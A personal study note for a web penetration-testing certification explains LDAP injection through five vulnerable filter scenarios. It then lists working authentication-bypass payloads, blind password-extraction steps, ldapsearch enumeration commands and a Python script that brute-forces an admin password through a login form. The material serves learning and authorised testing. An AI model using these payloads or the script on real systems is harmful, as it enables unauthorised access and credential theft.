2026-02-04 06:27

Status:

Tags: [[eWPTX]] [[LDAP]] [[LDAP Injection]]
###### Prerequisites: [[LDAP Injection - Overview]] [[LDAP Injection - Filter Syntax & Escaping]]
# LDAP Injection - Examples

## Example 1: Search feature (broadening results)

Scenario: an app lets users search the directory by name:

```text
(&(objectClass=person)(cn={input}))
```

If `{input}` isn’t escaped, LDAP metacharacters can change the filter so it matches **more than intended**.

What you observe:

- normal input returns a few matches
    
- special characters cause “too many” matches or different behavior
    

Why it matters:

- the app may display extra users and their attributes (email, department, phone)
    

---

## Example 2: Printer listing (true/false behavior)

Scenario: show Canon printers if they exist:

```text
(&(objectClass=printer)(type=Canon*))
```

If `type` comes from user input and isn’t escaped, a wildcard can shift “specific match” into “match many”.

What you observe:

- icons appear/disappear based on input (blind-style signal)
    

---

## Example 3: Authentication flow (logic manipulation)

Scenario: app searches LDAP for a user entry during login:

```text
(&(uid={username})(password={password}))
```

Risk pattern:

- the app **builds the filter string** using raw `{username}` / `{password}`
    
- and treats “LDAP returned at least one entry” as a successful login
    

Impact:

- a crafted input that changes filter structure can cause the search to return an entry even when credentials are wrong.

---

## Example 4: Authorization check via groups

Scenario: app checks membership before showing an admin page:

```text
(&(objectClass=group)(cn=Admins)(member={userDn}))
```

If `{userDn}` (or a username that becomes `{userDn}`) is not handled safely, a filter manipulation can break the assumption “only Admins pass”.

Why this is important:

- authorization checks are usually higher impact than data search pages
    

---

## Example 5: Account recovery / “does user exist?”

Scenario: password reset checks whether the email exists:

```text
(&(objectClass=person)(mail={email}))
```

If the UI behaves differently for “match” vs “no match”, injection can become a **user enumeration** channel:

- different response content
    
- different status code
    
- different timing
    
---

## Notes for safe testing

- Only test on systems you own/are authorized to test.
- Treat LDAP injection like blind SQLi: confirm with **behavior differences**, not with "dump everything".

---

## Actual Injection Payloads

### Authentication Bypass
```
# Close the filter and add always-true condition
username: admin)(|(cn=*
password: anything

# Result: (&(uid=admin)(|(cn=*)(password=anything)))
# The (|(cn=*) matches everything — bypass

# Another variant
username: *)(uid=*))(|(uid=*
password: anything
```

### Blind LDAP Enumeration
```
# Character-by-character extraction of admin password
# If response differs (true vs false):
password=a*    → false
password=b*    → false
password=s*    → true (first char is 's')
password=se*   → true (second char is 'e')
password=sec*  → true
# Continue until full value extracted

# Enumerate usernames
uid=a*   → exists
uid=ad*  → exists
uid=adm* → exists
uid=admin → found
```

### ldapsearch CLI Examples
```bash
# Basic search
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(uid=admin)"

# Anonymous bind enumeration
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(objectClass=*)"

# Authenticated search
ldapsearch -x -H ldap://target:389 -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"

# Search for specific attributes
ldapsearch -x -H ldap://target:389 -b "dc=example,dc=com" "(uid=*)" uid cn mail
```

### Python ldap3 Library
```python
from ldap3 import Server, Connection, ALL

# Connect
server = Server('ldap://target:389', get_info=ALL)
conn = Connection(server, auto_bind=True)

# Search
conn.search('dc=example,dc=com', '(uid=admin)', attributes=['cn', 'mail', 'uid'])
for entry in conn.entries:
    print(entry)

# Enumerate with wildcard (if anonymous bind allowed)
conn.search('dc=example,dc=com', '(objectClass=person)', attributes=['uid', 'cn'])
```

### Boolean Oracle Script
```python
import requests

charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = ''

for pos in range(20):
    for c in charset:
        payload = f"{password}{c}*"
        r = requests.post('http://target/login', data={
            'username': 'admin',
            'password': payload
        })
        if 'Welcome' in r.text:
            password += c
            print(f"[+] Found: {password}")
            break
    else:
        break

print(f"[+] Password: {password}")
```
